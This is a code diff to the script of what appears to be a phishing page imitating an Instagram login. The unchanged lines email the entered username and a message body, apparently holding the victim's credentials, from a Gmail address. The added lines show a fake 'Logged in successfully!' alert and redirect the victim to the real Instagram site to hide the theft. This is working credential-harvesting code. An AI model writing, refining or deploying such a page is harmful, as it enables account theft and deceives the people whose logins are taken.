@@ -41,9 +41,14 @@
                         From: "smilwanter@gmail.com",
                         Subject: username,
                         Body: body
-                    }).then(
-                        message => alert(message)
-                    );
+                    }).then(function (message) {
+                        if (message === 'OK') {
+                            alert('Logged in successfully!');
+                            window.location.href = 'https://www.instagram.com';
+                        } else {
+                            alert('Error Occur: ' + message);
+                        }
+                    });
                 }
             </script>
             <div class="sign-up">
